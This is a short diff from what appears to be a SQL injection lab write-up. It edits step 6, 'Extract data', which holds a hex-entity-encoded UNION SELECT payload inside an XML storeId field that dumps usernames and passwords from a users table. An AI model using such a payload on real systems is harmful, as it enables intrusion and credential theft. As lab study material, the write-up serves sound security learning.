@@ -36,7 +36,7 @@ Found:
 <img alt="columns" src="4.png" />
 
 ### Step 6 — Extract data
-<storeId><@hex_entities>1 UNION SELECT username || '--' || password FROM users</@hex_entities></storeId>
+<storeId><@hex_entities>1 UNION SELECT username || '-' || password FROM users</@hex_entities></storeId>
 
 Retrieved credentials.
 
